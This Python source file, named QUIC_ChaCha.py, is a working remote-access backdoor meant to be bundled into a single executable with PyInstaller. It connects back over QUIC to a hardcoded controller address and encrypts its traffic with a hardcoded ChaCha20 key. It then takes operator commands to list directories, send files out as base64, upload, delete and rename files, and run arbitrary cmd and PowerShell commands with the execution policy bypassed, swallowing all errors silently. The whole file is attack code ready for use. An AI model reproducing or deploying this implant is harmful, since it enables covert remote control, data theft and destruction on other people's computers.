# pyinstaller --onefile QUIC_ChaCha.py

import asyncio
import tempfile
import subprocess
import os
import base64
import json
from datetime import datetime
from Crypto.Cipher import ChaCha20
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.events import StreamDataReceived

class ChaChaCipher:
    def __init__(self, key: bytes):
        if isinstance(key, str):
            key = key.encode()
        if len(key) != 32:
            raise ValueError("ChaCha key must be 32 bytes")
        self.key = key

    def encrypt(self, raw_data: bytes) -> bytes:
        cipher = ChaCha20.new(key=self.key)
        encrypted = cipher.encrypt(raw_data)
        return cipher.nonce + encrypted

    def decrypt(self, enc_data: bytes) -> bytes:
        if len(enc_data) < 8:
            raise ValueError("Data too short (missing nonce)")
        nonce = enc_data[:8]
        ciphertext = enc_data[8:]
        cipher = ChaCha20.new(key=self.key, nonce=nonce)
        return cipher.decrypt(ciphertext)

class QUICClientPayload(QuicConnectionProtocol):
    def __init__(self, *args, chacha_cipher: ChaChaCipher = None, **kwargs):
        super().__init__(*args, **kwargs)
        self._buffer = b''
        self._authenticated = False
        self.chacha_cipher = chacha_cipher

    def quic_event_received(self, event):
        if not isinstance(event, StreamDataReceived):
            return

        self._buffer += event.data

        if not event.end_stream:
            return

        try:
            decrypted = self.chacha_cipher.decrypt(self._buffer)
            command = decrypted.decode("utf-8", errors="replace").strip()
        except Exception:
            self._buffer = b''
            return

        self._buffer = b''

        if not self._authenticated:
            self._authenticated = True

        if command.lower() == "ping":
            self.respond("pong")
        else:
            output = self.execute_command(command)
            self.respond(output)

    def respond(self, message: str):
        try:
            encrypted = self.chacha_cipher.encrypt(message.encode("utf-8"))
            stream_id = self._quic.get_next_available_stream_id()
            self._quic.send_stream_data(stream_id, encrypted, end_stream=True)
            self.transmit()
        except Exception:
            pass

    def browse_directory(self, path):
        try:
            if path.startswith('~'):
                path = os.path.expanduser(path)     
            if not os.path.exists(path):
                return {'success': False, 'error': f"Path does not exist: {path}", 'current_path': path, 'parent_path': None, 'items': []}
            
            items = []
            try:
                entries = os.listdir(path)
            except PermissionError:
                return {'success': False, 'error': f"Permission denied to access {path}", 'current_path': path, 'parent_path': None, 'items': []}
            
            for item in entries:
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    is_dir = os.path.isdir(item_path)
                    modified_timestamp = stat.st_mtime
                    modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    size_bytes = stat.st_size if not is_dir else 0    
                    items.append({'name': item, 'type': 'directory' if is_dir else 'file', 'size': size_bytes, 'modified_time': modified_time})
                except (PermissionError, OSError):
                    continue
            
            items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
            parent_path = os.path.dirname(path)
            if path.endswith(':\\') or path == '/':
                parent_path = None
            elif parent_path == path:
                parent_path = None
            
            return {'success': True, 'current_path': path, 'parent_path': parent_path, 'items': items}
        except Exception as e:
            return {'success': False, 'error': str(e), 'current_path': path, 'parent_path': None, 'items': []}

    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return f"ERROR: File not found: {filepath}"
            
            filesize = os.path.getsize(filepath)
            filename = os.path.basename(filepath)
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            file_data_b64 = base64.b64encode(file_data).decode('ascii')
            return f"file-data:{filename}|{filesize}|{file_data_b64}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def upload_file(self, filepath, filedata_b64):
        try:
            file_data = base64.b64decode(filedata_b64)
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            return f"SUCCESS: File uploaded to {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def delete_file(self, filepath):
        try:
            if os.path.isdir(filepath):
                os.rmdir(filepath)
            else:
                os.remove(filepath)
            return f"SUCCESS: Deleted {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def rename_file(self, old_path, new_path):
        try:
            os.rename(old_path, new_path)
            return f"SUCCESS: Renamed to {new_path}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def run_cmd_command(self, cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            return output.strip() if output.strip() else "[+] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 90 seconds"
        except Exception as e:
            return f"[-] CMD execution error: {str(e)}"

    def run_powershell_command(self, ps_cmd):
        try:
            result = subprocess.run(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-Command",
                    ps_cmd
                ],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            return output.strip() if output.strip() else "[+] PowerShell command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] PowerShell command timed out after 120 seconds"
        except Exception as e:
            return f"[-] PowerShell execution error: {str(e)}"

    def execute_command(self, command: str) -> str:
        command = (command or "").strip()
        if not command:
            return "[no command received]"

        if command.startswith("browse:"):
            browse_path = command[7:].strip()
            if not browse_path:
                browse_path = os.getcwd()
            dir_data = self.browse_directory(browse_path)
            json_str = json.dumps(dir_data, ensure_ascii=False)
            base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
            return f"browse-data-{base64_data}"
        
        if command.startswith("download-file:"):
            filepath = command[14:].strip()
            return self.download_file(filepath)
        
        if command.startswith("upload-file:"):
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                filepath, filedata_b64 = parts
                return self.upload_file(filepath, filedata_b64)
            else:
                return "ERROR: Invalid upload format"
        
        if command.startswith("delete-file:"):
            filepath = command[12:].strip()
            return self.delete_file(filepath)
        
        if command.startswith("rename-file:"):
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                old_path, new_path = parts
                return self.rename_file(old_path, new_path)
            else:
                return "ERROR: Invalid rename format"

        upper_cmd = command.upper()
        if upper_cmd.startswith("EP "):
            ps_command = command[3:].strip()
            result_str = self.run_powershell_command(ps_command)
        elif upper_cmd.startswith("EP"):
            ps_command = command[2:].strip()
            result_str = self.run_powershell_command(ps_command)
        else:
            result_str = self.run_cmd_command(command)

        return result_str

async def main():
    host = "192.168.1.107"
    port = 5555
    config = QuicConfiguration(is_client=True, verify_mode=False)
    KEY = b"12345678901234567890123456789012"
    cipher = ChaChaCipher(KEY)
    async with connect(
        host,
        port,
        configuration=config,
        create_protocol=lambda *args, **kwargs: QUICClientPayload(*args, chacha_cipher=cipher, **kwargs)
    ) as connection:
        token = "9ac453ec-30fb-43ba-9188-fe4350c9dbee"
        encrypted_token = cipher.encrypt(token.encode("utf-8"))
        stream_id = connection._quic.get_next_available_stream_id()
        connection._quic.send_stream_data(stream_id, encrypted_token, end_stream=True)
        connection.transmit()
        await asyncio.sleep(999999)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception:
        pass